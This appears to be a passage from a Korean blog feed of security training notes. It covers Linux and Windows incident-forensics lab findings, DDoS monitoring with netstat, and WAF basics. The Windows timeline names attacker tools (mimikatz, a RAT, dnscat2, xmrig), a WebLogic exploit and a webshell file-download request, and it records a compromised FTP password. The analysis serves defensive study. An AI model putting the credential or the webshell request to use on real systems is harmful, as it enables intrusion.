+  &lt;p&gt;/morningmall/m_login_ok.php&lt;/p&gt;
+
+  &lt;p&gt;hydra 사용(brute force 툴)&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;/var/log/apache2/access.log&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;Nov 1 23:29:02 192.168.171.1&lt;/p&gt;
+
+  &lt;p&gt;c99_madnet.php 접근(php webshell)&lt;/p&gt;
+
+  &lt;p&gt;코드 난독화&lt;/p&gt;
+
+  &lt;p&gt;base64 php decoding&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;/var/www/morningmall/dump_192.168.171.188_mysql_02-11-2014-00-07-10.sql&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;2014-11-02 00:07:10&lt;/p&gt;
+
+  &lt;p&gt;sql 덤프&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Useworld</name></author><summary type="html">Linux Image Dump</summary></entry><entry><title type="html">침해사고분석 - Windows</title><link href="http://localhost:4000/2018/08/02/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DWindows.html" rel="alternate" type="text/html" title="침해사고분석 - Windows" /><published>2018-08-02T00:00:00+09:00</published><updated>2018-08-02T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/02/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DWindows</id><content type="html" xml:base="http://localhost:4000/2018/08/02/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DWindows.html">&lt;h3 id=&quot;recovery복구&quot;&gt;Recovery(복구)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;DB로 생각하면 mdb 파일을 파일을 살림&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;restore복원&quot;&gt;Restore(복원)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;살린 파일의 DB 컨텐츠 내용을 살림&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;carving카빙&quot;&gt;Carving(카빙)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;헤더에 푸터, 조각들을 합쳐서 모아 살림&lt;/p&gt;
+
+  &lt;p&gt;푸터가 맞는 건지 확인 안됨(원본일지 확실하지 않음)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;이미지 뜰때는 피지컬 드라이브를 권고&lt;/li&gt;
+  &lt;li&gt;재부팅시 메모리덤프 의미 없음&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;registry&quot;&gt;Registry&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;\windows\system32\config&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;SAM&lt;/p&gt;
+
+  &lt;p&gt;SECURITY&lt;/p&gt;
+
+  &lt;p&gt;SYSTEM&lt;/p&gt;
+
+  &lt;p&gt;SOFTWARE&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;\users\[사용자]&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;NTUSER.DAT&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;event-log&quot;&gt;Event Log&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;root - windows - system32 - winevt - Logs&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;분석 시 Security.evtx가 가장 중요&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;실습--순서&quot;&gt;실습  순서&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ftk manager, regafree 증거자료 수집&lt;/p&gt;
+
+  &lt;p&gt;이상한 부분들 취합, 퍼즐 맞추듯이 시간순 나열 -&amp;gt; 큰그림이 됨&lt;/p&gt;
+
+  &lt;p&gt;사이사이 비는 조각 - 보안 장비 로그로 보안&lt;/p&gt;
+
+  &lt;p&gt;개요도 그리기(Attacker IP, Victim IP 정리)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;실습&quot;&gt;실습&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Security.evtx&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;2018-02-14 오전 11:44:40&lt;/p&gt;
+
+  &lt;p&gt;로그온 유형 : 3 실패 로그가 잔뜩 쌓이기 시작함&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Registry&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;2018-02-14 오전 11:46:59&lt;/p&gt;
+
+  &lt;p&gt;로그인 성공 후 infohack 계정 생성됨&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;SaveData.XML&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;2018-02-14 오후 1:56&lt;/p&gt;
+
+  &lt;p&gt;Moo0 File Monitor 의심스러운 감시 프로그램?&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;0214dump wireshark&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;2018-02-14 11:22:59 웹쉘 스캐닝 비정상 요청 - 실패&lt;/p&gt;
+
+  &lt;p&gt;2018-02-14 11:23:00 admin 페이지, 디렉토리 스캐닝 비정상 요청 - 실패&lt;/p&gt;
+
+  &lt;p&gt;2018-02-14 11:25:02 Oracle Web Logic 취약점 공격(CVE-2017-10271)&lt;/p&gt;
+
+  &lt;p&gt;2018-02-14 11:25:06 4444번 포트 이용 - webshell2.asp 다운로드, mimikatz.zip 다운로드, pkunzip.exe 다운로드&lt;/p&gt;
+
+  &lt;p&gt;2018-02-14 13:42:29 FTP Administrator/qwe123!@# 접속&lt;/p&gt;
+
+  &lt;p&gt;2018-02-14 13:51:46 stealDB.mdf 유출&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Windows Defender 검사 - 악성 코드 탐지&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \inetpub\wwwroot\mimikatz.zip
+ 2018-02-14 오전 11:28:16
+ mimikatz - 윈도우 계정의 암호를 알아내는 프로그램
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \inetpub\wwwroot\webshell2.asp
+ 2018-02-14 오전 11:28:14
+ 웹쉘 파일 업로드됨
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \inetpub\wwwroot\xmrig.exe
+ 2018-02-14 오후 01:27:09
+ 비트코인 광부 프로그램
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \windows\rat.exe
+ 2018-02-14 오전 11:40:55
+ 백도어 프로그램
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;$mft 분석&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \windows\dnscat2.exe
+ 2018-02-14 오전 11:43:14
+ dns tunneling 프로그램 접근
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \windows\quiet.exe
+ 2018-02-14 오전 11:43:14
+ 커맨드라인을 조용히 실행하는 프로그램
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \windows\nmap.exe
+ 2018-02-20 오전 10:28:47
+ 포트 스캐닝 실행
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; \inetpub\wwwroot\nmapresult.txt
+ 2018-02-20 오전 10:29:36
+ 포트 스캐닝 결과 파일 접근
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;웹 서버 로그(시간 UTC +9 안되어있음)&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;&lt;strong&gt;\inetpub\logs\LogFiles\W2SVC1\u_ex180214.log&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;2018-02-14 11:23:02부터 11:38:17 사이의 로그가 없어서 이상함&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;\inetpub\logs\LogFiles\W2SVC1\u_ex180214.log&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;2018-02-20 오전 10:30:34&lt;/p&gt;
+
+  &lt;p&gt;IP 192.168.164.136 GET /webshell2.asp&lt;/p&gt;
+
+  &lt;p&gt;웹쉘 접속&lt;/p&gt;
+
+  &lt;p&gt;2018-02-20 오전 10:30:41&lt;/p&gt;
+
+  &lt;p&gt;IP 192.168.164.136 GET /webshell2.asp action=download&amp;amp;file=C:|inetpub|wwwroot|nmapresult.txt 80&lt;/p&gt;
+
+  &lt;p&gt;웹쉘을 통해 스캐닝된 결과 파일 다운로드&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;프로그램 추가/삭제 목록&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;Java, SQL, Oracle WebLogic&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;웹로직 취약점&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;2018-02-14 오천 11:25:02&lt;/p&gt;
+
+  &lt;p&gt;7001번 포트&lt;/p&gt;
+
+  &lt;p&gt;Wireshark /wls-wsat/CoordinatorPortType&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Useworld</name></author><summary type="html">Recovery(복구)</summary></entry><entry><title type="html">DDoS(Distributed Denial of Service)</title><link href="http://localhost:4000/2018/08/01/DDOS.html" rel="alternate" type="text/html" title="DDoS(Distributed Denial of Service)" /><published>2018-08-01T00:00:00+09:00</published><updated>2018-08-01T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/01/DDOS</id><content type="html" xml:base="http://localhost:4000/2018/08/01/DDOS.html">&lt;h3 id=&quot;inbound-outbound&quot;&gt;InBound, OutBound&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;송수신 개념 확실히 이해해야 됨&lt;/p&gt;
+
+  &lt;p&gt;100Mbps 회선은 InBound, OutBount 각각 100Mbps 제공하여 합쳐서 200Mbps 제공&lt;/p&gt;
+
+  &lt;p&gt;DDoS공격은 외부에서 수신되는 방향이므로 InBound를 봐야함&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ddos-임계치-설정&quot;&gt;DDoS 임계치 설정&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;보통 7.7대란, 3.4대란을 기준으로 함&lt;/p&gt;
+
+  &lt;p&gt;PC 1대당 TCP 40pps, UDP 20pps&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;netstat-명령어&quot;&gt;NetStat 명령어&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;netstat -ansp tcp 1&lt;/td&gt;
+        &lt;td&gt;find “현재 연결”&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;netstat -an&lt;/td&gt;
+        &lt;td&gt;find /c “SYN”&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;netstat -an&lt;/td&gt;
+        &lt;td&gt;find /c “ESI”&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;netstat -an&lt;/td&gt;
+        &lt;td&gt;find /c “FIN”&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+&lt;/blockquote&gt;</content><author><name>Useworld</name></author><summary type="html">InBound, OutBound</summary></entry><entry><title type="html">WAF(Web Application Firewall)</title><link href="http://localhost:4000/2018/07/31/WAF.html" rel="alternate" type="text/html" title="WAF(Web Application Firewall)" /><published>2018-07-31T00:00:00+09:00</published><updated>2018-07-31T00:00:00+09:00</updated><id>http://localhost:4000/2018/07/31/WAF</id><content type="html" xml:base="http://localhost:4000/2018/07/31/WAF.html">&lt;h3 id=&quot;waf의-필요성&quot;&gt;WAF의 필요성&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;IPS는 전체 패킷 탐지&lt;/p&gt;
+
+  &lt;p&gt;WAF는 80, 443(http, https) 포트만 탐지&lt;/p&gt;
+
+  &lt;p&gt;WAF의 정책을 전부 IPS로 넘겨서 사용 불가능 - 탐지 엔진의 로직이 다름&lt;/p&gt;
+
+  &lt;p&gt;HW Bypass는 운영중에는 거의 쓸일이 없음&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ssl-인증서-등록&quot;&gt;SSL 인증서 등록&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;openssl, Keystore&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Useworld</name></author><summary type="html">WAF의 필요성</summary></entry></feed>
